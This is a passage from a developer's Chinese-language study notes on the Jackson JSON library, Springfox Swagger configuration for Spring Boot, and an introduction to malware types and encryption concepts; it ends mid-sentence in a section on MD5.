转Java对象\n**主要是使用ObjectMapper中的readValue方法**\n\n1. Read Object From JSON String\n```java\nObjectMapper objectMapper = new ObjectMapper();\nString carJson = \"{ \\\"brand\\\" : \\\"Mercedes\\\", \\\"doors\\\" : 5 }\";\nCar car = objectMapper.readValue(carJson, Car.class);\n```\n\n2. Read Object From JSON Reader\n```java\nObjectMapper objectMapper = new ObjectMapper();\nString carJson =  \"{ \\\"brand\\\" : \\\"Mercedes\\\", \\\"doors\\\" : 4 }\";\nReader reader = new StringReader(carJson);\nCar car = objectMapper.readValue(reader, Car.class);\n```\n\n3. Read Object From JSON File\n```java\nObjectMapper objectMapper = new ObjectMapper();\nFile file = new File(\"data/car.json\");\nCar car = objectMapper.readValue(file, Car.class);\n```\n\n4. Read Object From JSON via URL\n```java\nObjectMapper objectMapper = new ObjectMapper();\nURL url = new URL(\"file:data/car.json\");\nCar car = objectMapper.readValue(url, Car.class);\n```\n\n5. Read Object From JSON InputStream\n```java\nObjectMapper objectMapper = new ObjectMapper();\nInputStream input = new FileInputStream(\"data/car.json\");\nCar car = objectMapper.readValue(input, Car.class);\n```\n\n6. Read Object From JSON Byte Array\n```java\nObjectMapper objectMapper = new ObjectMapper();\nString carJson =  \"{ \\\"brand\\\" : \\\"Mercedes\\\", \\\"doors\\\" : 5 }\";\nbyte[] bytes = carJson.getBytes(\"UTF-8\");\nCar car = objectMapper.readValue(bytes, Car.class);\n```\n\n7. Read Object Array From JSON Array String\n```java\nString jsonArray = \"[{\\\"brand\\\":\\\"ford\\\"}, {\\\"brand\\\":\\\"Fiat\\\"}]\";\nObjectMapper objectMapper = new ObjectMapper();\nCar[] cars2 = objectMapper.readValue(jsonArray, Car[].class);\n```\n\n8. Read Object List From JSON Array String\n```java\nString jsonArray = \"[{\\\"brand\\\":\\\"ford\\\"}, {\\\"brand\\\":\\\"Fiat\\\"}]\";\nObjectMapper objectMapper = new ObjectMapper();\nList<Car> cars1 = objectMapper.readValue(jsonArray, new TypeReference<List<Car>>(){});\n```\n\n9. Read Map from JSON String\n```java\nString jsonObject = \"{\\\"brand\\\":\\\"ford\\\", \\\"doors\\\":5}\";\nObjectMapper objectMapper = new ObjectMapper();\nMap<String, Object> jsonMap = objectMapper.readValue(jsonObject, new TypeReference<Map<String,Object>>(){});\n```\n\n## 转Json\n**主要是使用ObjectMapper中的write方法**\nObjectMapper write有三个方法\n- writeValue()\n- writeValueAsString()\n- writeValueAsBytes()\n\n```java\nObjectMapper objectMapper = new ObjectMapper();\nCar car = new Car();\ncar.brand = \"BMW\";\ncar.doors = 4;\n//写到文件中\nobjectMapper.writeValue( new FileOutputStream(\"data/output-2.json\"), car);\n//写到字符串中\nString json = objectMapper.writeValueAsString(car);\n```\n\n## ObjectMapper的设置\n```java\nObjectMapper objectMapper = new ObjectMapper();\n//去掉默认的时间戳格式     \nobjectMapper.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, false);\n//设置为东八区\nobjectMapper.setTimeZone(TimeZone.getTimeZone(\"GMT+8\"));\n// 设置输入:禁止把POJO中值为null的字段映射到json字符串中\nobjectMapper.configure(SerializationFeature.WRITE_NULL_MAP_VALUES, false);\n //空值不序列化\nobjectMapper.setSerializationInclusion(JsonInclude.Include.NON_NULL);\n//反序列化时，属性不存在的兼容处理\nobjectMapper.getDeserializationConfig().withoutFeatures(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);\n//序列化时，日期的统一格式\nobjectMapper.setDateFormat(new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\"));\n//序列化日期时以timestamps输出，默认true\nobjectMapper.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, false);\n//序列化枚举是以toString()来输出，默认false，即默认以name()来输出\nobjectMapper.configure(SerializationFeature.WRITE_ENUMS_USING_TO_STRING,true);\n//序列化枚举是以ordinal()来输出，默认false\nobjectMapper.configure(SerializationFeature.WRITE_ENUMS_USING_INDEX,false);\n//类为空时，不要抛异常\nobjectMapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);\n//反序列化时,遇到未知属性时是否引起结果失败\nobjectMapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);\n //单引号处理\nobjectMapper.configure(JsonParser.Feature.ALLOW_SINGLE_QUOTES, true);\n//解析器支持解析结束符\nobjectMapper.configure(JsonParser.Feature.ALLOW_UNQUOTED_CONTROL_CHARS, true);\n```\n\n# JsonNode\nsonNode类，完整路径为com.fasterxml.jackson.databind.JsonNode，是Jackson的json树模型(对象图模型)\n\n## Json字符串转换成JsonNode对象 \n```java\nObjectMapper mapper = new ObjectMapper();  \nJsonNode jsonNode = mapper.readTree(json);\n```\n\n## 获取jsonNode的所有的key值\njsonNode的fieldNames方法是获取jsonNode的所有的key值\n```java\nIterator<String> keys = jsonNode.fieldNames();  \nwhile(keys.hasNext()){  \n    String key = keys.next();  \n    System.out.println(\"key键是:\"+key);  \n}\n```\n\n## 根据key值获取对应的jsonNode字段\n**方法一：使用get**\non对象一样，JsonNode可以多个字段。假设我们解析下面json值JsonNode:\n```json\n{\n    \"field1\" : \"value1\",\n    \"field2\" : 999\n}\njson有两个字段，如果你用jsonNode表示上面json对象，则可以获得其两个字段：\n```java\nJsonNode field1 = jsonNode.get(\"field1\");\nJsonNode field2 = jsonNode.get(\"field2\");\n```\n注意，即使两个字段是字符串类型，但get方法总是返回JsonNode类型表示字段。\n\n**方法二：使用at方法获取JsonNode字段**\n\nJackson JsonNode有个特殊方法是at()方法。at方法可以在给定JsonNode作为根节点Json对象图中访问任何字段。\n示例如下：\n```json\n{\n  \"identification\" :  {\n        \"name\" : \"James\",\n        \"ssn: \"ABC123552\"\n    }\n}\n```\n如果该json对应的JsonNode可以通过at方法访问其name字段：\n```java\nJsonNode nameNode = jsonNode.at(\"/identification/name\");\n```\n注意at方法的参数：字符串\"/identification/name\"，这是json路径表达式。路径表达式指定了完整的从JsonNode的根到要访问字段的路径，与文件系统的路径很相似。但需要提醒的是必须以/开头。\n\nat方法返回要访问的字段的JsonNode，如果没有找到则返回null。\n\n## 转换JsonNode字段\nJackson JsonNode类提供一组方法可以转换字段值至其他数据类型。如long、字符串等。请看示例：\n```java\nString f2Str = jsonNode.get(\"f2\").asText();\ndouble f2Dbl = jsonNode.get(\"f2\").asDouble();\nint    f2Int = jsonNode.get(\"f2\").asInt();\nlong   f2Lng = jsonNode.get(\"f2\").asLong();\n```\n如果f2字段包含值为123456，则其有可能呗转换为字符串，double，int，long类型。\n\n## 遍历JsonNode\n如果是一个JsonNode数组，使用jsonNode.elements();读取数组中每个node， 如果不是JsonNode数组，使用jsonNode.elements();返回jsonNode的values\n```java\nIterator<JsonNode> elements = jsonNode.elements();  \n while(elements.hasNext()){  \n     JsonNode node = elements.next();  \n     System.out.println(node.toString()); \n }\n```\n\n# ObjectNode\n## JsonNode与ObjectNode的区别\nThe Jackson JsonNode对象不可变，这意味着不能直接构建JsonNode实例的对象图，但你可以创建JsonNode 的子类ObjectNode实例的对象图。作为JsonNode 的子类，ObjectNode可以在任何使用了JsonNode之处使用\n\nJackson的JsonNode和ObjectNode两个类，前者是不可变的，一般用于读取。后者可变，一般用于创建Json对象图。\n\n## 操作ObjectNode\n由于JsonNode是不可变的。为了创建JsonNode对象图，你需要改变图中的JsonNode实例，如设置属性值和子JsonNode实例。因为其不可变性，不能直接进行操作，替代的是其子类ObjectNode，下面详细进行说明。\n\n### 设置ObjectNode属性\n首先创建ObjectNode实例：\n```java\nObjectMapper objectMapper = new ObjectMapper();\nObjectNode objectNode = objectMapper.createObjectNode();\n```\n为了设置ObjectNode对象属性，需要调用set方法。传入字段名和JsonNode作为参数。\n```java\nObjectMapper objectMapper = new ObjectMapper();\nObjectNode parentNode = objectMapper.createObjectNode();\n\nJsonNode childNode = readJsonIntoJsonNode();\n\nparentNode.set(\"child1\", childNode);\n```\nreadJsonIntoJsonNode()方法，是我们自己实现的，用来负责生产一些JsonNode对象，我们准备作为ObjectNode的子节点。\n\n### 设置ObjectNode属性值为原始数据类型值\nObjectNode类也提供一组方法用于设置属性值为原始数据类型。相对于转换原始值为JsonNode再进行设置要简单。请看示例：\n```java\nobjectNode.put(\"field1\", \"value1\");\nobjectNode.put(\"field2\", 123);\nobjectNode.put(\"field3\", 999.999);\n```\n\n# @JsonSerialize和@JsonDeserialize的使用详解\n## 背景\n在项目中处理数据时需要对所有的金额格式化操作，具体做法是，后端接收的金额类数据单位需要由万元转换为元在存入数据库，而返回到前端的金额类数据又必须由元转换为万元返回，以便保持数据一致。\n如果用传统方式，在保存和返回时加上转换的处理，需要复杂且繁琐的操作，jackson提供了JsonSerialize和JsonDeserialize注解来优雅的解决这个问题，项目采用的springboot框架，而springboot框架默认配置json转换工具就是jackson。如此，使用注解解决问题很nice了。\n\n## 注解简介：\n1. `@JsonSerialize`：json序列化注解，用于字段或get方法上，作用于getter()方法，将java对象序列化为json数据。\n```java\n@JsonSerialize(include = JsonSerialize.Inclusion.NON_NULL) //include里面包含了序列化的范围和作用的规则，本行作用是属性为null的时候不进行序列化操作。\n \n@JsonSerialize(using = Bean.class) //Bean 为实现类,Bean需要继承JsonSerializer<>,泛型就是作用字段的类型。\n```\n2. `@JsonDeserialize`：json反序列化注解，用于字段或set方法上，作用于setter()方法，将json数据反序列化为java对象。使用方法同@JsonSerialize类似。\n3. 常用于对数据进行简单的特殊处理，比如本次项目实践用到的，对金额类数据进行格式化操作。\n\n需要注意的是，该注解只在json序列化和反序列化的时候触发，其他时候并不生效！\n\n注意：json序列化及反序列化注解通常用在前后端传值上，作用于get,set方法上，但并不是重写get,set方法，而是类似于补充，追加。\n理解注解的作用和触发很重要，这能帮助我们知道该怎样来使用它！\n\n## 项目实践：\n1. 使用\n```java\n@JsonSerialize(using = BudgetSerializer.class)\n@JsonDeserialize(using = BudgetDeserializer.class)\nprivate BigDecimal applyBudget;\n```\n由于字段用于存储金额，所以采用了BigDecimal类。\n\n2. 自定义实现类\n\n首先需要自定义序列化及反序列化实现类，继承JsonSerializer<BigDecimal>类和JsonDeserializer<BigDecimal>，由于字段采用BigDecimal，所以泛型也使用BigDecimal。\n**BudgetSerializer：**\n```java\n@Slf4j\npublic class BudgetSerializer extends JsonSerializer<BigDecimal> {\n \n    @Override\n    public void serialize(BigDecimal s, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException {\n        BigDecimal format = s;\n        if (format != null) {\n            // 元转万元\n            format = format.divide(new BigDecimal(\"10000\"), 4, BigDecimal.ROUND_HALF_DOWN);\n            log.debug(\"元格式化万元：前 {}, 后 {}\", s, format);\n        }\n \n        jsonGenerator.writeNumber(format);\n    }\n}\n```\n作用：在返回给前端金额参数的时候，把数据库中的数据由元格式化为万元，就是除10000的操作。\n\n**BudgetDeserializer：**\n```java\n@Slf4j\npublic class BudgetDeserializer extends JsonDeserializer<BigDecimal> {\n    @Override\n    public BigDecimal deserialize(JsonParser jsonParser, DeserializationContext deserializationContext) throws IOException, JsonProcessingException {\n        try {\n            if (jsonParser == null || jsonParser.getText() == null) {\n                return null;\n            }\n            String s = jsonParser.getText();\n            BigDecimal format = new BigDecimal(StringUtils.isBlank(s) ? \"0\" : s);\n \n            // 万元转元\n            format = format.multiply(new BigDecimal(\"10000\"));\n            log.debug(\"万元格式化元：前 {}, 后 {}\", s, format);\n            return format;\n        } catch (Exception e) {\n            log.error(e.getMessage());\n            throw new RuntimeException(e);\n        }\n    }\n}\n```\n作用：在后端接收前端金额参数的时候，把前端的数据由万元格式化为元，就是乘10000的操作。"
  },
  {
    "title": "./notes/back-end/swagger.md",
    "body": "Swagger 是一个规范且完整的框架，用于生成、描述、调用和可视化RESTful风格的 Web 服务。\nSwagger 的目标是对`REST API`定义一个标准且和语言无关的接口，可以让人和计算机拥有无须访问源码、文档或网络流量监测就可以发现和理解服务的能力。当通过 Swagger 进行正确定义，用户可以理解远程服务并使用最少实现逻辑与远程服务进行交互。与为底层编程所实现的接口类似，Swagger 消除了调用服务时可能会有的猜测。\n\n**Swagger 的优势**\n- 支持 API 自动生成同步的在线文档：使用 Swagger 后可以直接通过代码生成文档，不再需要自己手动编写接口文档了，对程序员来说非常方便，可以节约写文档的时间去学习新技术。\n- 提供 Web 页面在线测试 API：光有文档还不够，Swagger 生成的文档还支持在线测试。参数和格式都定好了，直接在界面上输入参数对应的值即可在线测试接口。\n\n# springboot集成Swagger\n**在项目中使用Swagger需要如下2个依赖：**\n```xml\n<!-- swagger2依赖  -->\n<dependency>\n  <groupId>io.springfox</groupId>\n  <artifactId>springfox-swagger2</artifactId>\n  <version>2.9.2</version>\n</dependency>\n<!-- 官方swagger-ui依赖 该依赖的api网页访问路径为localhost:8080/swagger-ui.html  -->\n<dependency>\n  <groupId>io.springfox</groupId>\n  <artifactId>springfox-swagger-ui</artifactId>\n  <version>2.9.2</version>\n</dependency>\n\n<!-- 第三方swagger-ui依赖 该依赖的api网页访问路径为localhost:8080/doc.html  -->-->\n<!-- <dependency>\n\t<groupId>com.github.xiaoymin</groupId>\n\t<artifactId>swagger-bootstrap-ui</artifactId>\n\t<version>1.9.6</version>\n</dependency> -->\n```\n\n**添加Swagger配置文件**\n```java\n@Configuration\n@EnableSwagger2 // 开启Swagger2\npublic class SwaggerConfig{\n}\n```\n启动程序，访问`localhost:8080/swagger-ui.html`会出现下面页面：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123040.png)\n\n## 修改Swagger配置\n**SwaggerConfig配置文件**\n```java \n@Configuration\n@EnableSwagger2 // 开启Swagger2\npublic class SwaggerConfig {\n\n\t//配置Swagger的Docket的bean实例, 对应\n\t@Bean\n\tpublic Docket docket1() {\n\t\t//作者信息\n\t\tContact contact = new Contact(\"whz\", \"http://naiswang.gitee.io\", \"1152957995@qq.com\");\n\t  //swagger-ui.html首页中的展现信息\n\t\tApiInfo apiInfo = new ApiInfo(\n\t\t\t\t\t\t\t\t\t\t\t \"whz的swaggerAPI文档\",\n\t\t\t\t\t\t\t\t\t\t\t \"talking is cheap\",\n\t\t\t\t\t\t\t\t\t\t\t \"v1.0\",\n\t\t\t\t\t\t\t\t\t\t\t \"https://naiswang.gitee.io\",\n\t\t\t\t\t\t\t\t\t\t\t contact,\n\t\t\t\t\t\t\t\t\t\t\t \"Apache2.0\",\n\t\t\t\t\t\t\t\t\t\t\t \"http://www.apache.org/licenses/LICENSE-2.0\",\n\t\t\t\t\t\t\t\t\t\t\t new ArrayList());\n\t\treturn new Docket(DocumentationType.SWAGGER_2)\n\t\t\t\t.apiInfo(apiInfo)//修改的swagger-ui.html首页中的展现信息\n\t\t\t\t// .enable(false) //enable()用来设置是否开启Swagger, 如果设为false, 则swagger不能在浏览器中访问\n\t\t\t\t.groupName(\"第一个组\") //设置这个Docket的分组名， 没有Docket实例可以设置自己的分组名\n\t\t\t\t/**\n\t\t\t\t * 下面的.select().apis().paths()是要连着一起写的。用来设置swagger扫描接口方式\n\t\t\t\t */\n\t\t\t\t.select()\n\t\t\t\t/**\n\t\t\t\t * RequestHandlerSelector: 配置扫描接口的方式, 该类有如下静态方法\n\t\t\t\t * basePackget(包全路径): 指定要扫描的包\n\t\t\t\t * any(): 扫描全部\n\t\t\t\t * none(): 不扫描\n\t\t\t\t * withClassAnnotation(能用在类上的注解的class对象): 扫描类上的注解\n\t\t\t\t * withClassAnnotation(能用在方法上的注解的class对象): 扫描方法上的注解\n\t\t\t\t */\n\t\t\t\t.apis(RequestHandlerSelectors.basePackage(\"com.example.swagger2.controller\"))\n\t\t\t\t//.apis(RequestHandlerSelectors.any())\n\t\t\t\t//.apis(RequestHandlerSelectors.none())\n\t\t\t\t//.apis(RequestHandlerSelectors.withClassAnnotation(RestController.class))\n\t\t\t\t//.apis(RequestHandlerSelectors.withMethodAnnotation(RequestMapping.class))\n\t\t\t\t/**\n\t\t\t\t * paths(): 设置过滤路径\n\t\t\t\t */\n\t\t\t\t//.paths(PathSelectors.ant(\"/example/**\"))\n\t\t\t\t.build();\n\t}\n\t@Bean\n\tpublic Docket docket2(){\n\t\treturn new Docket(DocumentationType.SWAGGER_2).groupName(\"第二个组\");\n\t}\n}\n```\n**Controller层**\n```java\n@Api(tags=\"HelloworldController\")\n@RestController\npublic class HelloworldController {\n\n\t@ApiOperation(\"这是/hello的api\") //这个注解是给api添加注释的\n\t@RequestMapping(\"/hello\")\n\tpublic String hello(){\n\t\treturn \"hello\";\n\t}\n\n\t//只要我们的Controller方法的返回值存在实体类，这个实体类就会添加到swaggger的models中\n\t@PostMapping(value=\"/user\")\n\tpublic User user(){\n\t\treturn new User();\n\t}\n\n\t@GetMapping(\"/hello1\")\n\tpublic String hello1(@ApiParam(\"这是用户名\") String username){ // @ApiParam注解是给参数添加注释的\n\t\treturn \"hello\" + username;\n\t}\n}\n```\n**Pojo**\n```java\n//@Api(\"文档说明\") //与@ApiModel()功能一样\n@ApiModel(\"这是个User类\") // 设置User类被添加到swagger中Models后的User类的文档说明。\npublic class User {\n\n\t@ApiModelProperty(\"这是User类的用户名\") //设置User类被添加到swagger中Models后的name属性的文档说明\n\tprivate String name;\n\n\t@ApiModelProperty(\"这是User类的年龄\") // 设置User类被添加到swagger中Models后的age属性的文档说明\n\tprivate int age;\n\n\tpublic User(){ }\n\tpublic User(String name, int age){\n\t\tthis.name = name;\n\t\tthis.age = age;\n\t}\n\tpublic int getAge() {return age;}\n\tpublic String getName() { return name; }\n}\n```\n效果如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123052.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123102.png)\n\n## swagger包含的注解\n### @Api\n- 作用：用来指定接口的描述文字\n- 修饰范围：作用在类上\n```java\n@Api(tags = \"短信Controller\")\n@RestController\npublic class TestController {\n    ....\n}\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123113.png)\n\n### @ApiOperation\n- 作用：用来对接口中具体方法做描述\n- 修饰范围：作用在方法上\n```java\n@ApiOperation(value = \"接口总体描述\",notes = \"<span style='color:red;'>详细描述：</span>&nbsp;方法详细描述信息\")\n@GetMapping(\"/\")\npublic String login(String... index) {\n    return \"Hello login ~\";\n}\n```\n- value：用来对接口的总体描述\n- notes：用来对接口的详细描述\n\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123123.png)\n\n### @ApiImplicitParams\n- 作用：用来对接口中参数进行说明\n- 修饰范围：作用在方法上\n- 参数：@ApiImplicitParam数组\n\n#### @ApiImplicitParam\n- 作用：修饰接口方法里面的参\n- 修饰范围：作用方法上\n- 参数：\n  - name：方法参数名称\n  - value：方法参数的描述\n  - dataType：方法参数数据类型\n  - defaultValue ：方法参数默认值（给测试人员做测试用的）\n  - paramType ：\n    - 默认query：对应方式一\n    - path：对应方式二\n    - body：对应方式三\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123132.png)\n\n**方式一：url？id=1&user='qlh'后面参数**\n```js\n@ApiOperation(value = \"接口总体描述\", notes = \"<span style='color:red;'>详细描述：</span>&nbsp;方法详细描述信息\")\n@ApiImplicitParams({\n        @ApiImplicitParam(name = \"username\", value = \"用户名\", dataType = \"String\", defaultValue = \"qlh\"),\n        @ApiImplicitParam(name = \"password\", value = \"密码\", dataType = \"String\", defaultValue = \"123\")\n})\n@PostMapping(\"/\")\npublic String login(String username, String password) {\n    return \"Hello login ~\";\n}\n```\n\n**方式二：url/1/2路径后 传参 在路径中获取参数**\n```java\n@ApiOperation(value = \"接口总体描述\", notes = \"<span style='color:red;'>详细描述：</span>&nbsp;方法详细描述信息\")\n@ApiImplicitParams({\n        @ApiImplicitParam(name = \"id\", value = \"id\", dataType = \"String\", defaultValue = \"qlh\",paramType = \"path\"),\n        @ApiImplicitParam(name = \"name\", value = \"姓名\", dataType = \"String\", defaultValue = \"123\",paramType = \"path\")\n})\n@PostMapping(\"/index/{id}/{name}\")\npublic String index(@PathVariable(\"id\") String id, @PathVariable(\"name\") String name) {\n    return \"Hello World ~\";\n}\n```\n\n**方式三：在body中传参**\n```java\n@ApiOperation(value = \"接口总体描述\", notes = \"<span style='color:red;'>详细描述：</span>&nbsp;方法详细描述信息\")\n@ApiImplicitParams({\n        @ApiImplicitParam(name = \"id\", value = \"id\", dataType = \"String\", defaultValue = \"xxx\", paramType = \"body\"),\n        @ApiImplicitParam(name = \"name\", value = \"姓名\", dataType = \"String\", defaultValue = \"123\", paramType = \"body\")\n})\n@PostMapping(\"/index\")\npublic String index(@RequestBody Map<String, Object> map) {\n    return \"Hello World ~\";\n}\n```\n### @ApiResponses\n- 作用：用于接口的响应结果\n- 修改范围：作用在接口方法上\n- 参数：@ApiResponse数组\n```java\n@ApiResponses({\n        @ApiResponse(),\n        @ApiResponse(),\n        ...\n})\n```\n### @ApiResponse\n- 作用：在ApiResponses里面对响应码以及响应内容进行设置\n- 修饰范围：作用接口方法上\n- 参数：\n  - code：响应状态码\n  - message：响应状态码对应的响应内容\n\n```java\n@ApiResponse(code = 10001, message = \"签名错误\"),\n@ApiResponse(code = 10002, message = \"sql错误\"),\n@ApiResponse(code = 10003, message = \"服务怠机,请稍后重试\"),\n```\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409123141.png)\n\n### @ApiIgnore\n- 作用：忽略类，方法，参数。（忽略的意思：在swagger-ui.html中不显示）\n- 修改范围：作用在类，方法，参数上\n```java\n@ApiIgnore\n```\n\n### @ApiModel\n- 作用：用来对实体类进行说明\n- 修饰范围：作用在类上\n```java\n@ApiModel(value=\"类名\",description = \"实体类描述\")\n```\n\n### @ApiModelProperty\n- 作用：用来对实体类中的属性进行说明\n- 修饰范围：作用在类中的属性上\n```java\n@ApiModelProperty(value = \"类属性描述\",required = true,example = \"属性举例\",notes = \"备注\")\n```\n\n# Swagger配置鉴权token\n众所周知swagger在API文档生成及测试方面非常方便，但是很多的API调用都需要用到token验证，本文就介绍两中自动添加token的方法。以下的配置代码都是在swagger config类里边。\n\n**全站统一header设置**\n在swagger UI上出现一个Authorize按钮，一次输入header参数，全站使用。\n```java\n\t@Bean\n\tpublic Docket createRestApi(){\n\t\treturn new Docket(DocumentationType.SWAGGER_2)\n\t\t\t\t\t\t\t.apiInfo(apiInfo())\n\t\t\t\t\t\t\t.select()\n\t\t\t\t\t\t\t.apis(RequestHandlerSelectors.basePackage(\"com.example.server.controller\"))\n\t\t\t\t\t\t\t.paths(PathSelectors.any())\n\t\t\t\t\t\t\t.build()\n\n\t\t\t\t\t\t\t//全站统一header设置\n\t\t\t\t\t\t\t.securityContexts(securityContexts())\n\t\t\t\t\t\t\t.securitySchemes(securitySchemes());\n\n\t}\n\n\tprivate ApiInfo apiInfo(){\n\t\treturn new ApiInfoBuilder()\n\t\t\t\t.title(\"云E办接口文档\")\n\t\t\t\t.description(\"云E办接口文档\")\n\t\t\t\t.contact(new Contact(\"xxxx\", \"http://localhost:8081/doc.html\", \"xxx@xxx.com\"))\n\t\t\t\t.version(\"1.0\")\n\t\t\t\t.build();\n\t}\n\n\t/**\n\t*下面四个方法都是用于全站统一header设置\n\t*/\n\tprivate List<ApiKey> securitySchemes(){\n\t\t//设置请求头信息\n\t\tList<ApiKey> result = new ArrayList<>();\n\t\tApiKey apiKey = new ApiKey(\"Authorization\", \"Authorization\", \"Header\");\n\t\tresult.add(apiKey);\n\t\treturn result;\n\t}\n\n\tprivate List<SecurityContext> securityContexts(){\n\t\t//设置需要登陆认证的路径\n\t\tList<SecurityContext> result = new ArrayList<>();\n\t\tresult.add(getContextByPath(\"/hello/.*\"));\n\t\treturn result;\n\t}\n\n\t//注：此处的SecurityContext是springfox.documentation.spi.service.contexts包下的\n\tprivate SecurityContext getContextByPath(String pathRegex){\n\t\treturn SecurityContext.builder()\n\t\t\t\t.securityReferences(defaultAuth())\n\t\t\t\t.forPaths(PathSelectors.regex(pathRegex))\n\t\t\t\t.build();\n\t}\n\n\tprivate List<SecurityReference> defaultAuth(){\n\t\tList<SecurityReference> result = new ArrayList<>();\n\t\tAuthorizationScope authorizationScope = new AuthorizationScope(\"global\", \"accessEverything\");\n\t\tAuthorizationScope[] authorizationScopes = new AuthorizationScope[1];\n\t\tauthorizationScopes[0] = authorizationScope;\n\t\tresult.add(new SecurityReference(\"Authorization\", authorizationScopes));\n\t\treturn result;\n\t}\n\n```\n重点是在原先swagger的Docket对象后面添加securitySchemes方法与securityContext方法。\n\n统一header字段设置\n这样就在每次调用API的时候把Authorization、Authorization作为header内容发送给服务端。服务端就可以用这些字段进行必要的认证。\n\n# 模板\n```java\npackage com.example.server.config;\n\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport springfox.documentation.builders.ApiInfoBuilder;\nimport springfox.documentation.builders.PathSelectors;\nimport springfox.documentation.builders.RequestHandlerSelectors;\nimport springfox.documentation.service.*;\nimport springfox.documentation.spi.DocumentationType;\nimport springfox.documentation.spi.service.contexts.SecurityContext;\nimport springfox.documentation.spring.web.plugins.Docket;\nimport springfox.documentation.swagger2.annotations.EnableSwagger2;\n\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * Swagger2配置\n * @author : whz\n */\n@Configuration\n@EnableSwagger2\npublic class Swagger2Config {\n\n\t@Bean\n\tpublic Docket createRestApi(){\n\t\treturn new Docket(DocumentationType.SWAGGER_2)\n\t\t\t\t\t\t\t.apiInfo(apiInfo())\n\t\t\t\t\t\t\t.select()\n\t\t\t\t\t\t\t.apis(RequestHandlerSelectors.basePackage(\"com.example.server.controller\"))\n\t\t\t\t\t\t\t.paths(PathSelectors.any())\n\t\t\t\t\t\t\t.build()\n\n\t\t\t\t\t\t\t//全站统一header设置\n\t\t\t\t\t\t\t.securityContexts(securityContexts())\n\t\t\t\t\t\t\t.securitySchemes(securitySchemes());\n\n\t}\n\n\tprivate ApiInfo apiInfo(){\n\t\treturn new ApiInfoBuilder()\n\t\t\t\t.title(\"机器管理接口文档\")\n\t\t\t\t.description(\"机器管理接口文档\")\n\t\t\t\t.contact(new Contact(\"xxxx\", \"http://localhost:8080/doc.html\", \"xxx@xxx.com\"))\n\t\t\t\t.version(\"1.0\")\n\t\t\t\t.build();\n\t}\n\n\t/**\n\t*下面四个方法都是用于全站统一header设置\n\t*/\n\tprivate List<ApiKey> securitySchemes(){\n\t\t//设置请求头信息\n\t\tList<ApiKey> result = new ArrayList<>();\n\t\tApiKey apiKey = new ApiKey(\"Authorization\", \"Authorization\", \"Header\");\n\t\tresult.add(apiKey);\n\t\treturn result;\n\t}\n\n\tprivate List<SecurityContext> securityContexts(){\n\t\t//设置需要登陆认证的路径\n\t\tList<SecurityContext> result = new ArrayList<>();\n\t\tresult.add(getContextByPath(\"/hello/.*\"));\n\t\treturn result;\n\t}\n\n\t//注：此处的SecurityContext是springfox.documentation.spi.service.contexts包下的\n\tprivate SecurityContext getContextByPath(String pathRegex){\n\t\treturn SecurityContext.builder()\n\t\t\t\t.securityReferences(defaultAuth())\n\t\t\t\t.forPaths(PathSelectors.regex(pathRegex))\n\t\t\t\t.build();\n\t}\n\n\tprivate List<SecurityReference> defaultAuth(){\n\t\tList<SecurityReference> result = new ArrayList<>();\n\t\tAuthorizationScope authorizationScope = new AuthorizationScope(\"global\", \"accessEverything\");\n\t\tAuthorizationScope[] authorizationScopes = new AuthorizationScope[1];\n\t\tauthorizationScopes[0] = authorizationScope;\n\t\tresult.add(new SecurityReference(\"Authorization\", authorizationScopes));\n\t\treturn result;\n\t}\n}\n\n```\n"
  },
  {
    "title": "./notes/back-end/安全机制.md",
    "body": "# 病毒，木马，蠕虫的区别\n首先病毒，木马，蠕虫统称为电脑病毒。病毒（包含蠕虫）的共同特征是自我复制、传播、破坏电脑文件，对电脑造成数据上不可逆转的损坏。而木马独有特征是伪装成正常应用骗取用户信任而入侵，潜伏在电脑中盗取用户资料与信息。\n- 什么是病毒：\n病毒是编制者在计算机程序中插入的破坏计算机功能或者数据的代码，能影响计算机使用，能自我复制的一组计算机指令或者程序代码。\n \n- 什么是木马：\n木马也称木马病毒，是指通过特定的程序来控制另一台计算机。与一般的病毒不同，它不会自我繁殖，也专并不“刻意”地去感染其他文件，它通过将自身伪装吸引用户下载执行，向施种木马者提供打开被种主机的门户，使施属种者可以任意毁坏、窃取被种者的文件，甚至远程操控被种主机。\n \n- 什么是蠕虫病毒：\n蠕虫病毒一种能够利用系统漏洞通过网络进行自我传播的恶意程序。它不需要附着在其他程序上，而是独立存在的。当形成规模、传播速度过快时会极大地消耗网络资源导致大面积网络拥塞甚至瘫痪。\n\n# 加密、数字签名和数字证书\n## 加密\n### 什么是加密\n加密就是对明文数据按某种特殊算法进行处理，使其成为不可读的一段代码，通常称为“密文“， 密文通过”密钥“解密后还原出原来的明文，通过这样的途径可以达到保护数据不被非法人窃取、阅读的目的。\n定义简单吧？那来看个题，考虑以下哪些属于加密方法：\n- AES\n- RSA\n- MD5\n- BASE64\n- SM4\n这几种都是日常开发中常用的数据编码技术，但是只有 AES、RSA、SM4 才能算是加密方法。\n为什么呢？一个区分的简单方法就是看编码后的数据是否还能还原，能还原的是加密。\nMD5 实际上是对数据进行有损压缩，无论数据有多长，1KB、1Mb 还是 1G，都会生成固定 128 位的散列值，并且 MD5 理论上是不可能对编码后的数据进行还原的，即不可逆。\nMD5 因为其具有不可逆性、单向恒定性（相同的数据多次计算值不变）被广泛应用于文件完整性验证、口令加密以及接下来会讲到的数字签名中。\n至于 BASE64 是否算做加密方法，仁者见仁。在这里不下结论，因为 BASE64 编码不需要密钥，且编码后的字符串任何人都可以解码出原串，所以一般不认为是加密方法。BASE64 常用来做转码，把二进制字节序列转化为 ASCII 字符序列。\n\n### MD5\nMD5即Message-Digest Algorithm 